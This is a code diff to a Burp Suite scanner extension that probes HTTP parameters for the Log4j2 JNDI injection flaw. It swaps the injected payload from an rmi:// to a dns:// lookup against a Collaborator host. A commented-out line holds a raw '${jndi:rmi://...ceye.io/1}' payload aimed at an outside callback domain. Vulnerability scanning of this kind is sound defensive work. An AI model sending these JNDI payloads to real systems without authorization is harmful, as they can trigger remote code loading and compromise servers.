@@ -47,16 +47,18 @@ class BurpExtender(IBurpExtender, IScannerCheck, IBurpCollaboratorClientContext)
         for parameter in reqParameters:
             parameterName, parameterValue, parameterType = parameter.getName(), parameter.getValue(), parameter.getType()
             
-            parameterValueRCE = '%24%7Bjndi%3Armi%3A%2F%2F'+ str(self.payload) +'%2F1%7D'
+            parameterValueRCE = '%24%7Bjndi%3Adns%3A%2F%2F'+ str(self.payload) +'%2F1%7D'
+            #parameterValueRCE = '${jndi:rmi://'+ str(randomStr) + '.63lhuf.ceye.io/1}'
             newParameter = self._helpers.buildParameter(parameterName, parameterValueRCE, parameterType)
             newRequest = self._helpers.updateParameter(request, newParameter)
+            #print newRequest
             res = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),newRequest)
             if self.collaboratorContext.fetchCollaboratorInteractionsFor(self.payload):
                 print "Found Vuln!!!"
                 return [CustomScanIssue(
                     baseRequestResponse.getHttpService(),
-                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
-                    [self._callbacks.applyMarkers(baseRequestResponse, None, None)],
+                    self._helpers.analyzeRequest(res).getUrl(),
+                    [self._callbacks.applyMarkers(res, None, None)],
                     "Log4j2 JNDI",
                     'Vuln Parameter is {} \n Recvieved data from: {}'.format(str(parameterName),str(self.payload)),
                     "High")]
